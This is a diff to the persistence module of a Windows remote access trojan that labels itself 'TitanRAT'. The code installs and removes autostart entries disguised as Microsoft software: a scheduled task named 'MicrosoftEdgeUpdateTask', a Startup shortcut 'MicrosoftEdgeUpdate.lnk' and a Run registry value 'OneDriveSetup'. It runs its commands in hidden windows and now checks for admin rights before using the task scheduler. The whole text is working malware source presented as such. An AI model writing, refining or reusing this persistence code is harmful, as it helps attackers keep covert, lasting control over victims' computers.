@@ -1,10 +1,11 @@
-// Core/persistence.cpp 
+// Core/persistence.cpp — ФИНАЛЬНАЯ ВЕРСИЯ (ЗАМЕНИТЬ ЦЕЛИКОМ)
 #include "persistence.h"
 #include <windows.h>
+#include <shellapi.h>   // For IsUserAnAdmin()
+#include <shlobj.h>     // For SHGetFolderPathW, CSIDL_STARTUP
+#include <shlwapi.h>    // For PathFileExistsW
 #include <stdio.h>
 #include <string>
-#include <shlobj.h> // Shell API
-#include <shlwapi.h> // Path functions
 
 // Helper: run command silently
 static int run_cmd_hidden(const char* cmd) {
@@ -28,7 +29,7 @@ static int run_cmd_hidden(const char* cmd) {
     return -1;
 }
 
-// Create shortcut (Explicit Wide strings for Unicode projects)
+// Create shortcut (Unicode-safe)
 static bool create_startup_shortcut(const char* exe_path) {
     HRESULT hr = CoInitialize(NULL);
     if (FAILED(hr)) return false;
@@ -40,7 +41,6 @@ static bool create_startup_shortcut(const char* exe_path) {
         return false;
     }
 
-    // Convert char path to wchar
     WCHAR wPath[MAX_PATH];
     MultiByteToWideChar(CP_UTF8, 0, exe_path, -1, wPath, MAX_PATH);
 
@@ -55,7 +55,6 @@ static bool create_startup_shortcut(const char* exe_path) {
             WCHAR linkPath[MAX_PATH];
             wcscpy_s(linkPath, startupPath);
             wcscat_s(linkPath, L"\\MicrosoftEdgeUpdate.lnk");
-
             hr = pPersistFile->Save(linkPath, TRUE);
             if (SUCCEEDED(hr)) {
                 OutputDebugStringA("[TitanRAT] Startup shortcut created.\n");
@@ -118,28 +117,30 @@ static bool reg_value_exists() {
 void install_persistence(const char* exe_path) {
     if (!exe_path) return;
 
-    // 1. Try Task Scheduler
-    char cmd[2048];
-    bool has_space = (std::string(exe_path).find(' ') != std::string::npos);
-    if (has_space)
-        sprintf_s(cmd, "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"\\\"%s\\\"\" /sc onlogon /f", exe_path);
-    else
-        sprintf_s(cmd, "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"%s\" /sc onlogon /f", exe_path);
+    // Task Scheduler requires Admin. Gate it explicitly.
+    if (IsUserAnAdmin()) {
+        char cmd[2048];
+        bool has_space = (std::string(exe_path).find(' ') != std::string::npos);
+        if (has_space)
+            sprintf_s(cmd, "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"\\\"%s\\\"\" /sc onlogon /f", exe_path);
+        else
+            sprintf_s(cmd, "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"%s\" /sc onlogon /f", exe_path);
 
-    int rc = run_cmd_hidden(cmd);
-    char log[256];
-    sprintf_s(log, "[TitanRAT] Schtasks exit code: %d\n", rc);
-    OutputDebugStringA(log);
+        int rc = run_cmd_hidden(cmd);
+        char log[256];
+        sprintf_s(log, "[TitanRAT] Schtasks exit code: %d\n", rc);
+        OutputDebugStringA(log);
 
-    // 2. Fallback to Startup Folder if Scheduler fails
-    if (rc != 0) {
-        OutputDebugStringA("[TitanRAT] Scheduler failed. Fallback to Startup Folder.\n");
-        create_startup_shortcut(exe_path);
+        if (rc == 0) {
+            OutputDebugStringA("[TitanRAT] Task scheduler persistence installed.\n");
+        } else {
+            OutputDebugStringA("[TitanRAT] Warning: Task Scheduler creation failed.\n");
+        }
     } else {
-        OutputDebugStringA("[TitanRAT] Task scheduler persistence installed.\n");
+        OutputDebugStringA("[TitanRAT] Non-admin session: skipping Task Scheduler (requires elevation).\n");
     }
     
-    // 3. Registry
+    // Registry + Startup work without Admin. Always install.
     HKEY hKey;
     LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, 
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
@@ -152,16 +153,42 @@ void install_persistence(const char* exe_path) {
 }
 
 void uninstall_persistence() {
-    run_cmd_hidden("schtasks /delete /tn \"MicrosoftEdgeUpdateTask\" /f >nul 2>&1");
-    remove_startup_shortcut();
+    char log[256];
     
+    // Task Scheduler deletion requires Admin. Gate it.
+    if (IsUserAnAdmin()) {
+        int rc = run_cmd_hidden("schtasks /delete /tn \"MicrosoftEdgeUpdateTask\" /f 2>&1");
+        if (rc == 0) {
+            OutputDebugStringA("[TitanRAT] Task Scheduler: deleted successfully.\n");
+        } else {
+            sprintf_s(log, "[TitanRAT] Task Scheduler: failed (code %d). Check if task exists.\n", rc);
+            OutputDebugStringA(log);
+        }
+    } else {
+        OutputDebugStringA("[TitanRAT] Non-admin session: skipping Task Scheduler cleanup.\n");
+    }
+
+    // Remove Startup shortcut
+    WCHAR startupPath[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath))) {
+        WCHAR linkPath[MAX_PATH];
+        wcscpy_s(linkPath, startupPath);
+        wcscat_s(linkPath, L"\\MicrosoftEdgeUpdate.lnk");
+        
+        if (DeleteFileW(linkPath)) {
+            OutputDebugStringA("[TitanRAT] Startup shortcut removed.\n");
+        }
+    }
+    
+    // Remove Registry key
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                       "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, "OneDriveSetup");
+        LONG res = RegDeleteValueA(hKey, "OneDriveSetup");
+        sprintf_s(log, "[TitanRAT] Registry delete exit code: %ld\n", res);
+        OutputDebugStringA(log);
         RegCloseKey(hKey);
-        OutputDebugStringA("[TitanRAT] Registry persistence removed.\n");
     }
 }
 
